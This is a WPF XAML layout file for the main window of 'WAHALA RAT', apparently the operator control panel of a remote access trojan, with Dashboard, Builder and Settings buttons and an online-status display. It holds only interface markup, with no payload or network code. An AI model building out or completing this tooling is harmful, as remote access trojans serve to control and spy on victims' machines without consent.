<Window x:Class="WAHALA.Server.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="WAHALA RAT" Height="800" Width="1200"
        WindowStartupLocation="CenterScreen"
        Background="{StaticResource OffWhiteBrush}">
    <Grid>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="250"/>
            <ColumnDefinition Width="*"/>
        </Grid.ColumnDefinitions>

        <!-- Left Sidebar -->
        <Border Grid.Column="0" Background="{StaticResource AfricanTrianglePattern}">
            <Grid>
                <Grid.RowDefinitions>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="*"/>
                </Grid.RowDefinitions>

                <StackPanel Grid.Row="0" Margin="20,30,20,40">
                    <TextBlock Text="WAHALA" Foreground="{StaticResource WhiteBrush}" FontSize="24" FontWeight="Bold"/>
                    <TextBlock Text="RAT" Foreground="{StaticResource AccentGreenBrush}" FontSize="18" FontWeight="Light" Margin="0,-5,0,0"/>
                    <TextBlock Text="by Anonymous-beta" Foreground="{StaticResource MutedTextBrush}" FontSize="10" Margin="0,5,0,0"/>
                </StackPanel>

                <StackPanel Grid.Row="1" Margin="0,10,0,0">
                    <Button x:Name="BtnDashboard" Content="Dashboard" Style="{StaticResource SidebarButton}" Click="BtnDashboard_Click"/>
                    <Button x:Name="BtnBuilder" Content="Builder" Style="{StaticResource SidebarButton}" Click="BtnBuilder_Click"/>
                    <Button x:Name="BtnSettings" Content="Settings" Style="{StaticResource SidebarButton}" Click="BtnSettings_Click"/>
                </StackPanel>
            </Grid>
        </Border>

        <!-- Main Content -->
        <Grid Grid.Column="1">
            <Grid.RowDefinitions>
                <RowDefinition Height="60"/>
                <RowDefinition Height="*"/>
            </Grid.RowDefinitions>

            <Border Grid.Row="0" Background="{StaticResource WhiteBrush}" BorderBrush="{StaticResource OffWhiteBrush}" BorderThickness="0,0,0,1">
                <Grid>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="Auto"/>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>

                    <Image Grid.Column="0" Source="Assets/monkey-logo.png" Width="40" Height="40" Margin="20,10,10,10"/>
                    <TextBlock Grid.Column="1" Text="Unified Control Panel" VerticalAlignment="Center" FontSize="16" FontWeight="SemiBold" Foreground="{StaticResource DarkTextBrush}"/>
                    <TextBlock x:Name="TxtStatus" Grid.Column="2" Text="Status: Online" Margin="0,0,20,0" VerticalAlignment="Center" Foreground="{StaticResource MidGreenBrush}" FontWeight="Bold"/>
                </Grid>
            </Border>

            <ContentControl x:Name="MainContent" Grid.Row="1" Margin="20"/>
        </Grid>
    </Grid>
</Window>
